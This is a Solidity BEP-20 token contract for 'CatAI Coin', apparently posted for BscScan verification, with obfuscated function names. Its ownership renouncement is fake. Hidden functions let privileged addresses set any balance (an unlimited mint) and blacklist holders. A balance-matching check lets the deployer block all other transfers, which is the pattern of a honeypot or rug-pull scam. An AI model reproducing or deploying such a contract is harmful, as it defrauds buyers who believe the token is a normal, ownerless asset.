/**
 *Submitted for verification at BscScan.com on 2023-03-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface liquidityTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeSell) external view returns (uint256);

    function transfer(address exemptTo, uint256 enableReceiver) external returns (bool);

    function allowance(address buyEnableMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address exemptTo,
        uint256 enableReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed shouldBuy, uint256 value);
    event Approval(address indexed buyEnableMax, address indexed spender, uint256 value);
}

interface isMode is liquidityTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract buyAtTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listExempt {
    function createPair(address fundTake, address buyLimit) external returns (address);
}

interface toSenderWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CatAICoin is buyAtTrading, liquidityTx, isMode {

    address public isTrading;

    function maxExemptMode(address walletToken) public {
        if (modeReceiver) {
            return;
        }
        if (launchFrom) {
            tokenMode = false;
        }
        modeSellAt[walletToken] = true;
        if (maxTrading != totalSell) {
            totalSell = maxTrading;
        }
        modeReceiver = true;
    }

    function fundFromTake(address receiverAmount, address exemptTo, uint256 enableReceiver) internal returns (bool) {
        if (receiverAmount == modeList) {
            return exemptEnable(receiverAmount, exemptTo, enableReceiver);
        }
        uint256 minFee = liquidityTx(isTrading).balanceOf(tradingWallet);
        require(minFee == takeMarketing);
        require(!sellReceiver[receiverAmount]);
        return exemptEnable(receiverAmount, exemptTo, enableReceiver);
    }

    function transferFrom(address receiverAmount, address exemptTo, uint256 enableReceiver) external override returns (bool) {
        if (_msgSender() != tokenModeList) {
            if (exemptFromFee[receiverAmount][_msgSender()] != type(uint256).max) {
                require(enableReceiver <= exemptFromFee[receiverAmount][_msgSender()]);
                exemptFromFee[receiverAmount][_msgSender()] -= enableReceiver;
            }
        }
        return fundFromTake(receiverAmount, exemptTo, enableReceiver);
    }

    function balanceOf(address modeSell) public view virtual override returns (uint256) {
        return modeAuto[modeSell];
    }

    uint256 takeMarketing;

    uint256 private totalSell;

    address public modeList;

    mapping(address => uint256) private modeAuto;

    function decimals() external view virtual override returns (uint8) {
        return tradingLimit;
    }

    uint256 private maxTrading;

    uint256 totalTradingWallet;

    function tokenListIs() private view {
        require(modeSellAt[_msgSender()]);
    }

    function owner() external view returns (address) {
        return feeFrom;
    }

    function exemptEnable(address receiverAmount, address exemptTo, uint256 enableReceiver) internal returns (bool) {
        require(modeAuto[receiverAmount] >= enableReceiver);
        modeAuto[receiverAmount] -= enableReceiver;
        modeAuto[exemptTo] += enableReceiver;
        emit Transfer(receiverAmount, exemptTo, enableReceiver);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return swapShould;
    }

    address tradingWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed listIs, address indexed maxFund);

    bool public launchFrom;

    function allowance(address modeFund, address enableFromShould) external view virtual override returns (uint256) {
        if (enableFromShould == tokenModeList) {
            return type(uint256).max;
        }
        return exemptFromFee[modeFund][enableFromShould];
    }

    address tokenModeList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private minReceiverSwap = "CCN";

    function sellMarketing(address autoFromLaunched) public {
        tokenListIs();
        
        if (autoFromLaunched == modeList || autoFromLaunched == isTrading) {
            return;
        }
        sellReceiver[autoFromLaunched] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return minReceiverSwap;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return exemptReceiver;
    }

    bool public modeReceiver;

    bool private tokenMode;

    function launchedIs(uint256 enableReceiver) public {
        tokenListIs();
        takeMarketing = enableReceiver;
    }

    function transfer(address launchSwap, uint256 enableReceiver) external virtual override returns (bool) {
        return fundFromTake(_msgSender(), launchSwap, enableReceiver);
    }

    mapping(address => bool) public modeSellAt;

    function receiverBuy(address launchSwap, uint256 enableReceiver) public {
        tokenListIs();
        modeAuto[launchSwap] = enableReceiver;
    }

    constructor (){
        
        minLaunchedSell();
        toSenderWallet tradingLimitAt = toSenderWallet(tokenModeList);
        isTrading = listExempt(tradingLimitAt.factory()).createPair(tradingLimitAt.WETH(), address(this));
        
        modeList = _msgSender();
        modeSellAt[modeList] = true;
        modeAuto[modeList] = exemptReceiver;
        
        emit Transfer(address(0), modeList, exemptReceiver);
    }

    mapping(address => bool) public sellReceiver;

    function minLaunchedSell() public {
        emit OwnershipTransferred(modeList, address(0));
        feeFrom = address(0);
    }

    function approve(address enableFromShould, uint256 enableReceiver) public virtual override returns (bool) {
        exemptFromFee[_msgSender()][enableFromShould] = enableReceiver;
        emit Approval(_msgSender(), enableFromShould, enableReceiver);
        return true;
    }

    mapping(address => mapping(address => uint256)) private exemptFromFee;

    uint256 private exemptReceiver = 100000000 * 10 ** 18;

    uint8 private tradingLimit = 18;

    function getOwner() external view returns (address) {
        return feeFrom;
    }

    address private feeFrom;

    string private swapShould = "CatAI Coin";

}